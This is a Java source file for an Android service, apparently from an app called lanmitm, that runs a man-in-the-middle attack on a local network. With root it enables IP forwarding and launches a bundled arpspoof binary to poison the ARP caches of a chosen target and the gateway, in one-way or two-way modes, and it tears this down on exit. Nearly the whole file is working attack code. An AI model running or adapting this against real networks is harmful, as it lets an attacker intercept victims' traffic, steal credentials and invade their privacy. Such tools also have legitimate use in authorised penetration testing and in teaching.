package com.oinux.lanmitm.service;

import java.net.NetworkInterface;
import java.net.SocketException;

import com.oinux.lanmitm.AppContext;
import com.oinux.lanmitm.R;
import com.oinux.lanmitm.util.ShellUtils;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.widget.Toast;

public class ArpService extends Service {

	private String[] FORWARD_COMMANDS = { "echo 1 > /proc/sys/net/ipv4/ip_forward",
			"echo 1 > /proc/sys/net/ipv6/conf/all/forwarding" };

	private String[] UN_FORWARD_COMMANDS = { "echo 0 > /proc/sys/net/ipv4/ip_forward",
			"echo 0 > /proc/sys/net/ipv6/conf/all/forwarding" };

	public static final int TWO_WAY = 0x3;
	public static final int ONE_WAY_ROUTE = 0x1;
	public static final int ONE_WAY_HOST = 0x2;

	private Thread arpSpoof = null;
	private String arp_spoof_cmd = null;
	private String target_ip;
	private String arp_spoof_recv_cmd = null;
	private Thread arpSpoofRecv = null;
	private int arp_cheat_way = -1;
	private boolean ip_forward = true;

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		ShellUtils.execCommand("killall arpspoof", true, true);
		ip_forward = intent.getBooleanExtra("ip_forward", true);
		if (ip_forward)
			ShellUtils.execCommand(FORWARD_COMMANDS, true, true);
		else
			ShellUtils.execCommand(UN_FORWARD_COMMANDS, true, true);

		String interfaceName = null;
		try {
			interfaceName = NetworkInterface.getByInetAddress(
					AppContext.getInetAddress()).getDisplayName();
		} catch (Exception e) {
			e.printStackTrace();
			try {
				interfaceName = NetworkInterface.getByInetAddress(
						AppContext.getInetAddress()).getDisplayName();
			} catch (Exception se) {
				Toast.makeText(this, R.string.arp_service_start_error,
						Toast.LENGTH_SHORT).show();
				return START_STICKY_COMPATIBILITY;
			}
		}
		if (arp_cheat_way == -1)
			arp_cheat_way = intent.getIntExtra("arp_cheat_way",
					AppContext.getInt("arp_cheat_way", ONE_WAY_HOST));

		if ((ONE_WAY_HOST & arp_cheat_way) != 0) {
			if (target_ip == null)
				target_ip = AppContext.getTarget().getIp();

			if (!target_ip.equals(AppContext.getGateway()))
				arp_spoof_cmd = getFilesDir() + "/arpspoof -i " + interfaceName
						+ " -t " + target_ip + " "
						+ AppContext.getGateway();
			else
				arp_spoof_cmd = getFilesDir() + "/arpspoof -i " + interfaceName
						+ " -t " + AppContext.getGateway() + " "
						+ target_ip;

			arpSpoof = new Thread() {

				@Override
				public void run() {
					ShellUtils.execCommand(arp_spoof_cmd, true, false);
				}
			};
			arpSpoof.start();
		}
		if ((ONE_WAY_ROUTE & arp_cheat_way) != 0) {
			arp_spoof_recv_cmd = getFilesDir() + "/arpspoof -i " + interfaceName
					+ " -t " + AppContext.getGateway() + " "
					+ AppContext.getIp();

			arpSpoofRecv = new Thread() {
				@Override
				public void run() {
					ShellUtils.execCommand(arp_spoof_recv_cmd, true, false);
				}
			};
			arpSpoofRecv.start();
		}

		return super.onStartCommand(intent, flags, startId);
	}

	@Override
	public void onDestroy() {
		if (arpSpoof != null) {
			arpSpoof.interrupt();
			arpSpoof = null;
		}
		if (arpSpoofRecv != null) {
			arpSpoofRecv.interrupt();
			arpSpoofRecv = null;
		}
		new Thread() {
			public void run() {
				ShellUtils.execCommand("killall arpspoof", true, true);
				if (ip_forward)
					ShellUtils.execCommand(UN_FORWARD_COMMANDS, true, true);
			}
		}.start();
		super.onDestroy();
	}

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}
}
